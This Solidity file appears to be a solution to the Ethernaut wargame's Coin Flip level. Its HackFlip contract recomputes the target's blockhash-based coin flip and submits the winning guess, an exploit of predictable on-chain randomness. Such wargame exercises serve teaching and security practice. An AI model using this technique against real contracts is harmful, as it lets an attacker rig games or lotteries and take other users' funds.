// SPDX-License-Identifier: MIT

// Ethernauts 3. Coin Flip

pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract HackFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip public originalContract = CoinFlip("Your instance address here");

  constructor() {}

  function doNextWin() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    originalContract.flip(side);
  }
}

contract CoinFlip {
    function flip(bool _guess) public returns (bool) {}
}
